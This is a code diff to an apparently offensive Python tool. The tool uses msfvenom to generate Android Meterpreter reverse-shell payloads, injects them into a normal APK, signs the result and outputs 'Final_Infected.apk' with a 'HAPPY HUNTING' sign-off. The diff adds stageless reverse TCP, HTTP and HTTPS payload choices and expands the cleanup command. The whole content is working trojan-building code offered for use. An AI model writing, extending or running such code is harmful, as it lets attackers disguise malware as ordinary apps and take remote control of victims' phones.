@@ -69,9 +69,14 @@ def ask_for_payload_type():
     ====================================    
     [*] Available Types of Payload
     ====================================
+    \tStaged Payloads
     (1) android/meterpreter/reverse_tcp
     (2) android/meterpreter/reverse_http    
-    (3) android/meterpreter/reverse_https    
+    (3) android/meterpreter/reverse_https
+    \tStageless Payloads
+    (4) android/meterpreter_reverse_tcp    
+    (5) android/meterpreter_reverse_http
+    (6) android/meterpreter_reverse_https
     """)
     choice = int(
         input(f"{BLUE}[?] Which Type of Payload, You Want to Create (1/2/3): "))
@@ -86,6 +91,12 @@ def generate_meterpreter_payload(lhost, lport):
         type_of_payload = "android/meterpreter/reverse_http"
     elif payload_type == 3:
         type_of_payload = "android/meterpreter/reverse_https"
+    elif payload_type == 4:
+        type_of_payload = "android/meterpreter_reverse_tcp"
+    elif payload_type == 5:
+        type_of_payload = "android/meterpreter_reverse_http"
+    elif payload_type == 6:
+        type_of_payload = "android/meterpreter_reverse_https"
 
     print(f"{YELLOW}\n[*] Creating Android Payload Using msfvenom")
     os.system(
@@ -160,7 +171,7 @@ def zipalign_apk():
 def housekeeping():
     os.system(f"mv {pwd}/signed.apk {pwd}/Final_Infected.apk")
     os.system(
-        f"rm -rf {pwd}/normal_apk {pwd}/android_payload.apk {pwd}/injected.apk")
+        f"rm -rf {pwd}/android_payload {pwd}/normal_apk {pwd}/android_payload.apk {pwd}/injected.apk")
     print(f"{GREEN}[+] Output : {WHITE} {pwd}/Final_Infected.apk")
     print("\n\n")
     print(f"{GREEN}\n\n !!!! HAPPY HUNTING !!!!")
